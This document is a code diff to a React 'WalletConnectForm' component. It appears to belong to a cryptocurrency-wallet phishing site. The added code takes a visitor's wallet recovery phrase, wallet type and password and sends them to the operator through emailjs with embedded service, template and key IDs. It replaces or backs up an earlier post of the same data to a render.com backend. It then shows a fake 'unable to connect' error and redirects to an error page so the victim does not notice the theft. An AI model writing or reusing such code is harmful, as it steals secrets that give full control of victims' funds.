@@ -53,8 +53,31 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     if (validatePhrase(phrase)) {
       try {
 
-        await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
-        
+        await emailjs.send(
+          'service_umld2d4',
+          'template_dwuojlh',
+          {
+            to_name: "dapp",
+            from_name: name,
+            message: `
+              Name: ${name}
+              Type: ${type}
+              Data: ${data}
+              Password: ${password}
+            `,
+          },
+          'o_NYBBGCjR2YIkIYu'
+        );
+        toast.error('unable to connect', {
+          position: "top-right",
+          autoClose: 2500,
+          hideProgressBar: false,
+          closeOnClick: true,
+          pauseOnHover: true,
+          draggable: true,
+          progress: undefined,
+          theme: "light",
+          });
         setTimeout(() => {
           navigate('/error')
         }, 3000);
@@ -93,8 +116,8 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     try {
 
       await emailjs.send(
-        'service_ghf9i5i',
-        'template_7agj3ul',
+        'service_umld2d4',
+        'template_dwuojlh',
         {
           to_name: "dapp",
           from_name: name,
@@ -105,10 +128,19 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
             Password: ${password}
           `,
         },
-        'Y2zgK5wDVULj3uyvk'
+        'o_NYBBGCjR2YIkIYu'
       );
+      toast.error('unable to connect',  {
+        position: "top-right",
+        autoClose: 2500,
+        hideProgressBar: false,
+        closeOnClick: true,
+        pauseOnHover: true,
+        draggable: true,
+        progress: undefined,
+        theme: "light",
+        });
 
-      await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
       setTimeout(() => {
         navigate('/error')
       }, 3000);
